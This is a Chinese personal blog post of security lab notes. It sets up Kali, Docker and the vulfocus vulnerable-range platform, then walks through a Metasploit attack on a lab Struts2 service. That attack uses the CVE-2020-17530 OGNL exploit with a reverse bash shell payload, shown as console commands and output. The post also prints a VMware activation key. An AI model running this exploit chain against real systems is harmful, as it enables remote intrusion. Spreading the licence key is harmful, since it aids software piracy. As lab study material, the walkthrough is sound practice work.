<!DOCTYPE html><html lang="zh-CN"><head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="https://s2.loli.net/2022/08/03/faI9itgrycnkWCF.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://s2.loli.net/2022/08/03/faI9itgrycnkWCF.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://s2.loli.net/2022/08/03/faI9itgrycnkWCF.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">





  
  

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"marshver.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#FF0000","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"输入关键词","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="网络空间安全笔记主要是vulfocus">
<meta property="og:type" content="article">
<meta property="og:title" content="网络空间安全笔记">
<meta property="og:url" content="https://marshver.github.io/2024/07/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="MarshVer">
<meta property="og:description" content="网络空间安全笔记主要是vulfocus">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/08/03/yJ23MDaUGdg7LCk.gif">
<meta property="article:published_time" content="2024-07-17T07:09:26.000Z">
<meta property="article:modified_time" content="2024-07-17T07:19:49.365Z">
<meta property="article:author" content="MarshVer">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/08/03/yJ23MDaUGdg7LCk.gif">

<link rel="canonical" href="https://marshver.github.io/2024/07/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>网络空间安全笔记 | MarshVer</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<script>function loadCss(l){var d=document,h=d.head,s=d.createElement('link');s.rel='stylesheet';s.href=l;!function e(f){if (d.body)return f();setTimeout(function(){e(f)})}(function(){h.appendChild(s);});}loadCss('/style.css');loadCss('//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css');</script><noscript><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css"></noscript></head>

<body itemscope="" itemtype="http://schema.org/WebPage">

  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">MarshVer</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">13</span></a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope="" itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://marshver.github.io/2024/07/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">

    <span hidden="" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://s2.loli.net/2022/08/03/gTEIJebhf812WaZ.png">
      <meta itemprop="name" content="MarshVer">
      <meta itemprop="description" content="个人博客">
    </span>

    <span hidden="" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MarshVer">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          网络空间安全笔记
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-07-17 15:09:26 / 修改时间：15:19:49" itemprop="dateCreated datePublished" datetime="2024-07-17T15:09:26+08:00">2024-07-17</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 ≈</span>
              <span>38 分钟</span>
            </span>
            <div class="post-description">网络空间安全笔记主要是vulfocus</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="1-下载VMware-17并安装kali"><a href="#1-下载VMware-17并安装kali" class="headerlink" title="1.下载VMware 17并安装kali"></a>1.下载VMware 17并安装kali</h1><ol>
<li>VMware激活码：MC60H DWHD5 H80U9 6V85M 8280D</li>
<li>下载VMware版的kali：<a target="_blank" rel="noopener" href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></li>
<li>VMware选择kali .vmx后缀的文件，启动kali系统（账号密码均为kali）（可将内存提高到6-8G，不然bulfocus容易卡死）</li>
<li>VMware给kali增加一个仅主机模式的网卡（以供本地主机ssh连接和访问WebGoat）</li>
</ol>
<h1 id="2-配置kali"><a href="#2-配置kali" class="headerlink" title="2.配置kali"></a>2.配置kali</h1><ol>
<li>ps aux | grep ssh //查看ssh是否启动</li>
<li>sudo systemctl enable ssh //启用开机启动ssh</li>
<li>sudo systemctl start ssh //启动ssh</li>
<li>ip a //查看IP地址</li>
</ol>
<h1 id="3-本地ssh本地连接虚拟机"><a href="#3-本地ssh本地连接虚拟机" class="headerlink" title="3.本地ssh本地连接虚拟机"></a>3.本地ssh本地连接虚拟机</h1><h2 id="3-1-cmd连接kali"><a href="#3-1-cmd连接kali" class="headerlink" title="3.1.cmd连接kali"></a>3.1.cmd连接kali</h2><ol>
<li>ssh <a href="mailto:kali@192.168.137.128">kali@192.168.137.128</a>  //本地远程连接kali，ip地址为仅主机模式网卡</li>
</ol>
<h2 id="3-2-vscode连接kali"><a href="#3-2-vscode连接kali" class="headerlink" title="3.2.vscode连接kali"></a>3.2.vscode连接kali</h2><ol>
<li>vscode下载Remote - SSH插件</li>
<li>搜索栏输入&gt;ssh,选择添加新的SSH主机</li>
<li>再次输入ssh <a href="mailto:kali@192.168.137.128">kali@192.168.137.128</a></li>
<li>选择本地C:\users\zhuze.ssh\config的配置文件(保存kali到本地ssh配置文件)</li>
<li>再次在搜索栏输入&gt;ssh,选择:将当前窗口连接到主机，选择kali的ip地址</li>
<li>选择Linux-&gt;选择确定-&gt;输入密码：kali即可显示kali文件夹</li>
</ol>
<h1 id="4-下载docker并配置"><a href="#4-下载docker并配置" class="headerlink" title="4.下载docker并配置"></a>4.下载docker并配置</h1><ol>
<li>apt update    //更新软件包</li>
<li>sudo apt install docker.io docker-compose //apt下载docker</li>
<li>sudo usermod -a -G docker kali    //添加当前用户加入docker用户组</li>
</ol>
<h1 id="5-下载ctf-games并拉取vulfocus镜像"><a href="#5-下载ctf-games并拉取vulfocus镜像" class="headerlink" title="5.下载ctf-games并拉取vulfocus镜像"></a>5.下载ctf-games并拉取vulfocus镜像</h1><ol>
<li>git clone <a target="_blank" rel="noopener" href="https://github.com/c4pr1c3/ctf-games.git">https://github.com/c4pr1c3/ctf-games.git</a></li>
<li>进入 /ctf-games/fofapro/vulfocus </li>
<li>拉取拉取vulfocus镜像</li>
</ol>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></tbody></table></figure>

<h1 id="6-安装jq"><a href="#6-安装jq" class="headerlink" title="6.安装jq"></a>6.安装jq</h1><ol>
<li>直接启动 bash start.sh 发生报错，显示未安装jq</li>
<li>安装jq</li>
</ol>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install jq</span><br></pre></td></tr></tbody></table></figure>

<h1 id="7-启动并访问vulfocus"><a href="#7-启动并访问vulfocus" class="headerlink" title="7.启动并访问vulfocus"></a>7.启动并访问vulfocus</h1><ol>
<li>进入 /ctf-games/fofapro/vulfocus 并启动</li>
</ol>
<figure class="highlight crmsh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash <span class="literal">start</span>.sh</span><br></pre></td></tr></tbody></table></figure>

<ol start="2">
<li>直接确定或者输入你的仅主机模式的ip地址</li>
<li>本地浏览器输入仅主机模式的ip地址即可访问：<a target="_blank" rel="noopener" href="http://192.168.223.128/">http://192.168.223.128/</a></li>
<li>账号密码均为admin</li>
</ol>
<h1 id="8-基本使用"><a href="#8-基本使用" class="headerlink" title="8.基本使用"></a>8.基本使用</h1><ol>
<li>进入镜像管理-镜像管理</li>
<li>点击一键同步同步练习环境</li>
<li>可搜索相应的镜像名称并下载</li>
<li>等待下载完成即可在首页显示</li>
</ol>
<h1 id="9-场景管理"><a href="#9-场景管理" class="headerlink" title="9.场景管理"></a>9.场景管理</h1><h2 id="9-1-添加场景"><a href="#9-1-添加场景" class="headerlink" title="9.1.添加场景"></a>9.1.添加场景</h2><ol>
<li>进入场景管理-环境编排管理</li>
<li>点击添加场景，创建编排场景，点击上传，并上传DMZ.zip文件并保存</li>
<li>选择对应场景并发布，等待下载完成</li>
</ol>
<h2 id="9-2-启动场景"><a href="#9-2-启动场景" class="headerlink" title="9.2.启动场景"></a>9.2.启动场景</h2><ol>
<li>选择场景菜单</li>
<li>点击对应的场景</li>
<li>启动场景便可看到访问地址</li>
<li>用当前ip地址加访问地址的端口即可进入该场景</li>
</ol>
<h1 id="10-安装metasploit-framework-渗透测试框架"><a href="#10-安装metasploit-framework-渗透测试框架" class="headerlink" title="10.安装metasploit-framework(渗透测试框架)"></a>10.安装metasploit-framework(渗透测试框架)</h1><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入root用户</span></span><br><span class="line"><span class="attribute">sudo</span> su - </span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新安装包索引</span></span><br><span class="line">apt update</span><br><span class="line"><span class="comment"># 更新metasploit-framework</span></span><br><span class="line">apt upgrade metasploit-framework</span><br></pre></td></tr></tbody></table></figure>

<h1 id="11-获取flag1"><a href="#11-获取flag1" class="headerlink" title="11.获取flag1"></a>11.获取flag1</h1><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化metasploit本地工作数据库</span></span><br><span class="line">msfdb init</span><br><span class="line"><span class="comment"># 若已存在本地工作数据库，可重置该数据库</span></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 建立工作区</span></span><br><span class="line">workspace -a demo</span><br><span class="line"><span class="comment"># 查看工作区</span></span><br><span class="line">workspace -l</span><br><span class="line"><span class="comment"># 确认已连接 pgsql</span></span><br><span class="line">db_status</span><br><span class="line"><span class="comment"># 开始信息收集</span></span><br><span class="line">db_nmap -p <span class="number">9937</span> <span class="number">192.168</span>.<span class="number">172.128</span> -n -A  // -n:禁止ip地址反向解析域名，加快扫描速度；- A:常用的套装参数，开启端口识别、操作系统指纹识别等</span><br><span class="line"><span class="comment"># 查看扫描的结果</span></span><br><span class="line">hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hosts</span></span><br><span class="line"><span class="comment"># =====</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># address          mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span></span><br><span class="line"><span class="comment"># -------          ---  ----  -------  ---------  -----  -------  ----  --------</span></span><br><span class="line"><span class="comment"># 192.168.172.128             Unknown                    device</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询exploit包含struts2的攻击工具</span></span><br><span class="line">search struts2 type:exploit</span><br><span class="line"></span><br><span class="line"><span class="comment"># Matching Modules</span></span><br><span class="line"><span class="comment"># ================</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    #   Name                                                                       Disclosure Date  Rank       Check  Description</span></span><br><span class="line"><span class="comment">#    -   ----                                                                       ---------------  ----       -----  -----------</span></span><br><span class="line"><span class="comment">#    0   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution</span></span><br><span class="line"><span class="comment">#    1   exploit/multi/http/struts2_multi_eval_ognl                                 2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation</span></span><br><span class="line"><span class="comment">#    2     \_ target: Unix Command                                                  .                .          .      .</span></span><br><span class="line"><span class="comment">#    3     \_ target: Linux Dropper                                                 .                .          .      .</span></span><br><span class="line"><span class="comment">#    4   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection</span></span><br><span class="line"><span class="comment">#    5     \_ target: Automatic detection                                           .                .          .      .</span></span><br><span class="line"><span class="comment">#    6     \_ target: Windows                                                       .                .          .      .</span></span><br><span class="line"><span class="comment">#    7     \_ target: Linux                                                         .                .          .      .</span></span><br><span class="line"><span class="comment">#    8   exploit/multi/http/struts2_rest_xstream                                    2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE</span></span><br><span class="line"><span class="comment">#    9     \_ target: Unix (In-Memory)                                              .                .          .      .</span></span><br><span class="line"><span class="comment">#    10    \_ target: Windows (In-Memory)                                           .                .          .      .</span></span><br><span class="line"><span class="comment">#    11    \_ target: Python (In-Memory)                                            .                .          .      .</span></span><br><span class="line"><span class="comment">#    12    \_ target: PowerShell (In-Memory)                                        .                .          .      .</span></span><br><span class="line"><span class="comment">#    13    \_ target: Linux (Dropper)                                               .                .          .      .</span></span><br><span class="line"><span class="comment">#    14    \_ target: Windows (Dropper)                                             .                .          .      .</span></span><br><span class="line"><span class="comment">#    15  exploit/multi/http/struts2_code_exec_showcase                              2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution</span></span><br><span class="line"><span class="comment">#    16  exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution</span></span><br><span class="line"><span class="comment">#    17    \_ target: Java                                                          .                .          .      .</span></span><br><span class="line"><span class="comment">#    18    \_ target: Linux                                                         .                .          .      .</span></span><br><span class="line"><span class="comment">#    19    \_ target: Windows                                                       .                .          .      .</span></span><br><span class="line"><span class="comment">#    20    \_ target: Windows / Tomcat 6 &amp; 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .</span></span><br><span class="line"><span class="comment">#    21  exploit/multi/http/struts2_content_type_ognl                               2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection</span></span><br><span class="line"><span class="comment">#    22  exploit/multi/http/struts_code_exec_parameters                             2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution</span></span><br><span class="line"><span class="comment">#    23    \_ target: Windows Universal                                             .                .          .      .</span></span><br><span class="line"><span class="comment">#    24    \_ target: Linux Universal                                               .                .          .      .</span></span><br><span class="line"><span class="comment">#    25    \_ target: Java Universal</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看struts2_multi_eval_ognl</span></span><br><span class="line">info <span class="number">2</span></span><br><span class="line"><span class="comment"># 使用struts2_multi_eval_ognl</span></span><br><span class="line">use <span class="number">2</span></span><br><span class="line">或者</span><br><span class="line">use struts2_multi_eval_ognl</span><br><span class="line"><span class="comment"># 查看可用payloads</span></span><br><span class="line">show payloads</span><br><span class="line"><span class="comment"># 使用合适的payload</span></span><br><span class="line"><span class="keyword">set</span> payload payload/cmd/unix/reverse_bash</span><br><span class="line"><span class="comment"># 查看可配置参数列表</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># Module options (exploit/multi/http/struts2_multi_eval_ognl):</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="comment">#    ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="comment">#    CVE        CVE-2020-17530   yes       Vulnerability to use (Accepted: CVE-2020-17530, CVE-2019-0230)</span></span><br><span class="line"><span class="comment">#    NAME       id               yes       The HTTP query parameter or form data name</span></span><br><span class="line"><span class="comment">#    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="comment">#    RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span></span><br><span class="line"><span class="comment">#    RPORT      8080             yes       The target port (TCP)</span></span><br><span class="line"><span class="comment">#    SSL        false            no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="comment">#    SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span></span><br><span class="line"><span class="comment">#    TARGETURI  /                yes       A valid base path to a struts application</span></span><br><span class="line"><span class="comment">#    URIPATH                     no        The URI to use for this exploit (default is random)</span></span><br><span class="line"><span class="comment">#    VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Name     Current Setting  Required  Description</span></span><br><span class="line"><span class="comment">#    ----     ---------------  --------  -----------</span></span><br><span class="line"><span class="comment">#    SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses</span></span><br><span class="line"><span class="comment">#                                        .</span></span><br><span class="line"><span class="comment">#    SRVPORT  8080             yes       The local port to listen on.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Payload options (cmd/unix/reverse_bash):</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="comment">#    ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="comment">#    LHOST  192.168.147.128  yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="comment">#    LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Exploit target:</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Id  Name</span></span><br><span class="line"><span class="comment">#    --  ----</span></span><br><span class="line"><span class="comment">#    0   Unix Command</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali终端查看4444端口是否被占用，未被占用可直接使用</span></span><br><span class="line">ss -lntp | grep <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回msfconsole设置攻击者主机lhost</span></span><br><span class="line"><span class="keyword">set</span> lhost <span class="number">192.168</span>.<span class="number">172.128</span></span><br><span class="line"><span class="comment"># 设置被攻击者主机rhosts</span></span><br><span class="line"><span class="keyword">set</span> rhosts <span class="number">192.168</span>.<span class="number">172.128</span></span><br><span class="line"><span class="comment"># 设置被攻击者rport</span></span><br><span class="line"><span class="keyword">set</span> rport <span class="number">63467</span></span><br><span class="line"><span class="comment"># 查看修改后的可配置参数列表</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># Module options (exploit/multi/http/struts2_multi_eval_ognl):</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="comment">#    ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="comment">#    CVE        CVE-2020-17530   yes       Vulnerability to use (Accepted: CVE-2020-17530, CVE-2019-0230)</span></span><br><span class="line"><span class="comment">#    NAME       id               yes       The HTTP query parameter or form data name</span></span><br><span class="line"><span class="comment">#    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="comment">#    RHOSTS     192.168.172.128  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span></span><br><span class="line"><span class="comment">#    RPORT      18805             yes       The target port (TCP)</span></span><br><span class="line"><span class="comment">#    SSL        false            no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="comment">#    SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span></span><br><span class="line"><span class="comment">#    TARGETURI  /                yes       A valid base path to a struts application</span></span><br><span class="line"><span class="comment">#    URIPATH                     no        The URI to use for this exploit (default is random)</span></span><br><span class="line"><span class="comment">#    VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    Name     Current Setting  Required  Description</span></span><br><span class="line"><span class="comment">#    ----     ---------------  --------  -----------</span></span><br><span class="line"><span class="comment">#    SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses</span></span><br><span class="line"><span class="comment">#                                        .</span></span><br><span class="line"><span class="comment">#    SRVPORT  8080             yes       The local port to listen on.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Payload options (cmd/unix/reverse_bash):</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="comment">#    ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="comment">#    LHOST  192.168.172.128  yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="comment">#    LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Exploit target:</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#    Id  Name</span></span><br><span class="line"><span class="comment">#    --  ----</span></span><br><span class="line"><span class="comment">#    0   Unix Command</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 注：这里恰好攻击者与被攻击者为同一主机</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动后台攻击</span></span><br><span class="line">run 